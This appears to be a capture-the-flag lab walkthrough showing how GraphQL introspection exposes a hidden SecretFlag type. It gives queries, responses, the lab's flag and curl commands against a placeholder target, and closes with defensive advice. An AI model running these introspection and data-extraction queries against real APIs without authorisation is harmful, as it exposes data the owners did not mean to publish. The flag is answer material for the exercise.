<h4>Overview</h4>
<p>
    GraphQL introspection is a built-in feature that reveals the entire API schema. When
    enabled in production, attackers can discover hidden types, fields, and relationships
    that were never intended to be publicly accessible. This lab demonstrates how introspection
    reveals a hidden <code>SecretFlag</code> type.
</p>

<h4>Step 1: Test Normal Queries</h4>
<p>Start by running normal queries to understand the API surface.</p>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 1. Normal Queries</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Query: </span>{ users { id username email } }<br>
        <span class="prompt">Result: </span><br>
        [<br>
        &nbsp;&nbsp;{"id": 1, "username": "alice", "email": "alice@example.com"},<br>
        &nbsp;&nbsp;{"id": 2, "username": "admin", "email": "admin@sqli-arena.local"}<br>
        ]<br><br>
        <span class="prompt">Query: </span>{ products { id name price category } }<br>
        <span class="prompt">Result: </span><br>
        [<br>
        &nbsp;&nbsp;{"id": 1, "name": "Widget", "price": 9.99, "category": "tools"},<br>
        &nbsp;&nbsp;{"id": 2, "name": "Gadget", "price": 19.99, "category": "electronics"}<br>
        ]
    </div>
</div>

<h4>Step 2: Run Introspection Query</h4>
<p>
    Send the standard <code>__schema</code> introspection query to discover all types and
    their fields.
</p>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 2. Introspection</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Query:</span><br>
        { __schema { types { name fields { name } } } }<br><br>
        <span class="prompt">Types discovered:</span><br>
        &nbsp;&nbsp;- <strong>User</strong>: [id, username, email, role]<br>
        &nbsp;&nbsp;- <strong>Product</strong>: [id, name, price, category]<br>
        &nbsp;&nbsp;- <strong>SecretFlag</strong>: [id, flag, description] &lt;-- hidden type!<br>
        &nbsp;&nbsp;- <strong>MutationResult</strong>: [success, message]<br>
        &nbsp;&nbsp;- <strong>Query</strong>: [user, users, product, products, <strong>secretflags</strong>]<br>
        &nbsp;&nbsp;- <strong>Mutation</strong>: [updateProfile]
    </div>
</div>
<p>
    The introspection reveals a <code>SecretFlag</code> type with <code>id</code>,
    <code>flag</code>, and <code>description</code> fields. The Query type exposes
    a <code>secretflags</code> resolver.
</p>

<h4>Step 3: Query the Hidden SecretFlag Type</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 3. Extract Flag</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Query:</span><br>
        { secretflags { id flag description } }<br><br>
        <span class="prompt">Response:</span><br>
        {<br>
        &nbsp;&nbsp;"data": {<br>
        &nbsp;&nbsp;&nbsp;&nbsp;"secretflags": [<br>
        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{<br>
        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;"id": 1,<br>
        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;"flag": "<strong>FLAG{gq_1ntr0sp3ct_sch3m4}</strong>",<br>
        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;"description": "Hidden flag discoverable via introspection"<br>
        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br>
        &nbsp;&nbsp;&nbsp;&nbsp;]<br>
        &nbsp;&nbsp;}<br>
        }
    </div>
</div>

<h4>Step 4: Submit the Flag</h4>
<p>
    Copy the flag: <code>FLAG{gq_1ntr0sp3ct_sch3m4}</code>.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">curl. Full Exploit</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Step 1: </span>curl -s -X POST http://target:4000/graphql/lab1 \<br>
        &nbsp;&nbsp;-H "Content-Type: application/json" \<br>
        &nbsp;&nbsp;-d '{"query":"{ __schema { types { name fields { name } } } }"}'<br><br>
        <span class="prompt">Step 2: </span>curl -s -X POST http://target:4000/graphql/lab1 \<br>
        &nbsp;&nbsp;-H "Content-Type: application/json" \<br>
        &nbsp;&nbsp;-d '{"query":"{ secretflags { id flag description } }"}'
    </div>
</div>

<div class="result-success result-box">
    <strong>Key Takeaway:</strong> GraphQL introspection (<code>__schema</code>, <code>__type</code>)
    reveals the entire API schema including hidden types, fields, and resolvers. In this lab,
    the <code>SecretFlag</code> type and <code>secretflags</code> query were not documented
    but fully accessible. Defense: disable introspection in production
    (<code>introspection: false</code> in Apollo Server), implement field-level authorization,
    and use persisted queries to prevent arbitrary query execution. Tools like
    <code>InQL</code> and <code>graphql-voyager</code> automate schema discovery.
</div>
